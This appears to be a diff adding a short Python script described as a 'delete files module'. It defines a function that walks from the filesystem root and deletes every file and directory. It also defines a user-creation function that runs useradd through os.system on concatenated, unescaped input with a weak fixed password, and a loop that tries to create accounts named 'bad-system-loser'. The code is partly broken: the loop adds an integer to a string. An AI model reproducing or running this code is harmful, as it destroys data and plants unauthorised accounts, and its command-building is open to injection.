@@ -1,0 +1,22 @@
+#!/usr/bin/python3
+
+# delete files module
+
+import os
+import crypt
+
+def delete_root():
+    for root, dirs, files in os.walk("/", topdown=False):
+        for name in files:
+            os.remove(os.path.join(root, name))
+        for name in dirs:
+            os.rmdir(os.path.join(root, name))
+
+def createUser(name,username,password):
+  encPass = crypt.crypt(password,"22")
+  return os.system("useradd -p "+encPass+ " -s "+ "/bin/bash "+ "-d "+ "/home/" + username+ " -m "+ " -c \""+ name+"\" " + username)
+
+i = 1
+while i < 10:
+    createUser("bad-system-loser" + i, "bad-sys" + i, "password");
+    i += 1
